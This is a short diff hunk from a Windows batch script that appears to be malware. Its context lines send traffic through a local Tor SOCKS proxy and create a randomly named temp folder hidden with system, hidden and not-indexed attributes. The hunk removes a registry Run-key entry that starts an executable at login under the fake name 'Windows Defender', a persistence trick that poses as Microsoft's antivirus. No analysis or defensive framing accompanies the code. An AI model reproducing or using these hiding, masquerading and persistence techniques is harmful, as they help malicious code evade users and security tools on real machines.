@@ -18,8 +18,6 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
   set "proxy=--tlsv1"
 )
 
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
-
 set "folder=%random%"
 mkdir "%temp%\%folder%" 
 attrib +s +h +i "%temp%\%folder%" 
